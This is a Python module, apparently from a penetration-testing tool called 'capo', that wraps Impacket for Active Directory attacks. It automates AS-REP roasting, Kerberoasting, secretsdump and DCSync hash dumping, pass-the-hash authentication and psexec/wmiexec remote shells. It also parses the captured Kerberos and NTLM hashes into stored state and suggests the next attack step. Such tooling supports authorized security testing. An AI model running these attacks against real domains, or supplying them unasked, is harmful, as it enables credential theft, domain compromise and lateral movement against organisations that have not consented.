"""Impacket wrapper for Kerberos attacks and lateral movement.

Covers: AS-REP roasting, Kerberoasting, secretsdump, DCSync,
        psexec, wmiexec, smbclient (interactive shells).
"""

import os
import re
import shlex
import shutil
import subprocess
from datetime import datetime, timezone
from pathlib import Path

from capo.modules.wrappers.base import BaseWrapper
from capo.state import state_manager
from capo.utils.display import console, print_command, print_info, print_success, print_warning


# Regex patterns for hash parsing
_ASREP_RE  = re.compile(r'(\$krb5asrep\$\S+)', re.IGNORECASE)
_TGS_RE    = re.compile(r'(\$krb5tgs\$\S+)', re.IGNORECASE)
# secretsdump / DCSync: user:RID:LMhash:NThash:::
_NTLM_RE   = re.compile(
    r'^(?:[\w\\.]+\\)?([\w\.\-\$]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', re.MULTILINE
)


def _find_impacket(script: str) -> str:
    """Resolve an impacket binary trying multiple naming conventions."""
    candidates = [
        f"impacket-{script}",   # Kali/Debian package install
        f"{script}.py",          # source install
        script,
    ]
    for c in candidates:
        if shutil.which(c):
            return c
    return f"impacket-{script}"  # will produce a clear error at runtime


class ImpacketWrapper(BaseWrapper):
    tool_name   = "impacket"
    binary_name = "impacket-secretsdump"  # primary availability check

    def is_available(self) -> bool:
        for name in [
            "impacket-secretsdump", "secretsdump.py",
            "impacket-GetNPUsers",  "GetNPUsers.py",
        ]:
            if shutil.which(name):
                return True
        return False

    # ── Auth helpers ──────────────────────────────────────────────────────────

    def _auth_str(self, username: str, password: str, hashes: str,
                  domain: str, target: str) -> tuple[str, list[str]]:
        """Return (auth_target_string, extra_flags) for an impacket command.

        auth_target_string: DOMAIN/user:pass@ip   (or without domain prefix)
        extra_flags: [] or ['-hashes', 'LM:NT']   when using hash auth
        """
        dom = domain or state_manager.get("domain", "")
        prefix = f"{dom}/{username}" if dom else username

        if hashes:
            if ":" not in hashes:
                hashes = f"aad3b435b51404eeaad3b435b51404ee:{hashes}"
            return f"{prefix}@{target}", ["-hashes", hashes]

        return f"{prefix}:{password}@{target}", []

    def _output_base(self, label: str) -> Path:
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        out = self._output_dir() / f"impacket_{ts}_{label}"
        out.parent.mkdir(parents=True, exist_ok=True)
        return out

    # ── AS-REP Roasting ───────────────────────────────────────────────────────

    def asrep_roast(self, target: str | None = None, domain: str = "",
                    userfile: str = "", username: str = ""):
        """AS-REP roast — request TGTs for accounts without pre-auth.

        Requires a domain and either a user list or a single username.
        No credentials needed (unauthenticated).
        """
        target  = self._resolve_target(target)
        domain  = domain or state_manager.get("domain", "")
        binary  = _find_impacket("GetNPUsers")
        out     = self._output_base("asrep")

        if not domain:
            print_warning("Domain required. Use --domain or set via 'capo nxc null'.")
            return

        # If no explicit userfile/user, fall back to discovered users in state
        if not userfile and not username:
            users = state_manager.get("users", [])
            if users:
                tmp = out.with_suffix(".users_tmp")
                tmp.write_text("\n".join(users))
                userfile = str(tmp)
                print_info(f"Using {len(users)} users from state → {tmp}")
            else:
                print_warning("No userfile or username specified and no users in state.")
                return

        cmd = [binary, f"{domain}/", "-no-pass", "-dc-ip", target,
               "-format", "hashcat", "-outputfile", str(out.with_suffix(".hashes"))]

        if userfile:
            cmd += ["-usersfile", userfile]
        else:
            cmd[1] = f"{domain}/{username}"   # replace domain/ with domain/user

        self.execute(cmd, output_file=out.with_suffix(".txt"), stream_output=True)

    # ── Kerberoasting ─────────────────────────────────────────────────────────

    def kerberoast(self, target: str | None = None, domain: str = "",
                   username: str = "", password: str = "", hashes: str = ""):
        """Kerberoast — request TGS tickets for accounts with SPNs."""
        target = self._resolve_target(target)
        domain = domain or state_manager.get("domain", "")
        binary = _find_impacket("GetUserSPNs")
        out    = self._output_base("kerberoast")

        if not domain or not username:
            print_warning("Domain and username required for Kerberoasting.")
            return

        auth, extra = self._auth_str(username, password, hashes, domain, target)

        cmd = [binary, auth, "-dc-ip", target,
               "-request", "-outputfile", str(out.with_suffix(".hashes")),
               *extra]
        self.execute(cmd, output_file=out.with_suffix(".txt"), stream_output=True)

    # ── Secretsdump ───────────────────────────────────────────────────────────

    def secretsdump(self, target: str | None = None, username: str = "",
                    password: str = "", hashes: str = "", domain: str = ""):
        """Dump SAM/LSA/NTDS hashes remotely via secretsdump."""
        target = self._resolve_target(target)
        binary = _find_impacket("secretsdump")
        out    = self._output_base("secretsdump")

        auth, extra = self._auth_str(username, password, hashes, domain, target)

        cmd = [binary, auth, *extra]
        self.execute(cmd, output_file=out.with_suffix(".txt"), stream_output=True)

    # ── DCSync ────────────────────────────────────────────────────────────────

    def dcsync(self, target: str | None = None, username: str = "",
               password: str = "", hashes: str = "", domain: str = "",
               dump_user: str = ""):
        """DCSync — replicate NTDS hashes using domain replication rights.

        Targets the domain controller. Use dump_user='Administrator' to dump
        a single account, or leave blank for all accounts.
        """
        target = self._resolve_target(target)
        domain = domain or state_manager.get("domain", "")
        binary = _find_impacket("secretsdump")
        out    = self._output_base("dcsync")

        if not domain:
            print_warning("Domain required for DCSync. Use --domain.")
            return

        auth, extra = self._auth_str(username, password, hashes, domain, target)

        cmd = [binary, auth, "-just-dc", *extra]
        if dump_user:
            cmd += ["-just-dc-user", dump_user]

        self.execute(cmd, output_file=out.with_suffix(".txt"), stream_output=True)

    # ── Interactive Shells ────────────────────────────────────────────────────

    def exec_shell(self, tool: str, target: str | None = None,
                   username: str = "", password: str = "",
                   hashes: str = "", domain: str = ""):
        """Launch an interactive impacket shell (psexec, wmiexec, smbclient).

        Replaces the current process via os.execvp so the user gets a real TTY.
        """
        target = self._resolve_target(target)
        binary = _find_impacket(tool)

        if not shutil.which(binary):
            print_warning(f"{binary} not found. Install impacket.")
            return

        auth, extra = self._auth_str(username, password, hashes, domain, target)
        cmd = [binary, auth, *extra]

        cmd_str = " ".join(shlex.quote(a) for a in cmd)
        print_command(cmd_str)

        # Record intent in state before handing off
        state_manager.add_scan_record(
            tool=f"impacket-{tool}",
            command=cmd_str,
            output_file="(interactive)",
        )

        os.execvp(binary, cmd)  # replaces this process — no return

    # ── Output Parsing ────────────────────────────────────────────────────────

    def parse_output(self, result: subprocess.CompletedProcess, output_file: Path | None):
        """Parse impacket output: extract hashes and usernames into state."""
        output = (result.stdout or "") + (result.stderr or "")
        if not output:
            return

        hashes_found = 0
        users_found  = 0

        # AS-REP hashes
        for m in _ASREP_RE.findall(output):
            # extract username from $krb5asrep$23$user@domain:...
            user_part = m.split("$")[3].split("@")[0] if "$" in m else ""
            state_manager.add_hash(m, username=user_part)
            if user_part:
                state_manager.add_user(user_part)
            hashes_found += 1

        # TGS (kerberoast) hashes
        for m in _TGS_RE.findall(output):
            user_part = ""
            # $krb5tgs$23$*user*domain*service*...
            inner = m.split("$*")
            if len(inner) > 1:
                user_part = inner[1].split("*")[0]
            state_manager.add_hash(m, username=user_part)
            if user_part:
                state_manager.add_user(user_part)
            hashes_found += 1

        # NTLM hashes from secretsdump / DCSync
        for match in _NTLM_RE.finditer(output):
            user, _rid, lm, nt = match.group(1), match.group(2), match.group(3), match.group(4)
            empty_lm = "aad3b435b51404eeaad3b435b51404ee"
            empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
            if nt != empty_nt:
                state_manager.add_hash(f"{lm}:{nt}", username=user)
                state_manager.add_user(user)
                hashes_found += 1
                users_found  += 1

        if hashes_found:
            print_success(f"Captured {hashes_found} hash(es) → saved to state + hashes.txt")
        if users_found:
            print_success(f"Discovered {users_found} user(s) → saved to state")

        # Also check the hashcat outputfile if it exists
        if output_file:
            hash_file = output_file.with_suffix(".hashes")
            if hash_file.exists():
                raw = hash_file.read_text(errors="ignore")
                for m in _ASREP_RE.findall(raw) + _TGS_RE.findall(raw):
                    state_manager.add_hash(m)

    def get_suggestions(self) -> list[tuple[str, str]]:
        """Context-aware suggestions for Kerberos / lateral movement."""
        suggestions = []
        domain  = state_manager.get("domain", "")
        users   = state_manager.get("users", [])
        creds   = state_manager.get("credentials", [])
        hashes  = state_manager.get("hashes", [])
        ports   = state_manager.get_open_ports()

        if domain and users and not hashes:
            suggestions.append((
                f"AD domain '{domain}' + {len(users)} users — try AS-REP roasting",
                "capo kerberos asrep-roast --domain " + domain,
            ))

        if domain and creds:
            suggestions.append((
                "Valid creds found — try Kerberoasting",
                "capo kerberos kerberoast --domain " + domain,
            ))

        if hashes and (445 in ports or 139 in ports):
            suggestions.append((
                "NTLM hashes + SMB open — try secretsdump or psexec",
                "capo kerberos secretsdump",
            ))

        return suggestions
